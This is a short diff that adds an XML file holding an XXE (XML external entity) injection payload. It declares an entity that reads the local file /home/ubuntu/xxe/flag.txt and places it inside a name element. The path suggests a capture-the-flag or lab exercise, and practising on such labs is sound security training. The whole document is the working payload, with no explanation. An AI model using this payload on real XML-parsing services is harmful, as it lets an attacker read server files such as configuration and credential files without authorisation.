@@ -1,0 +1,3 @@
+<?xml version="1.0"?>
+<!DOCTYPE name [ <!ENTITY lol SYSTEM "file:///home/ubuntu/xxe/flag.txt">]>
+<name>Hello, &lol;</name>
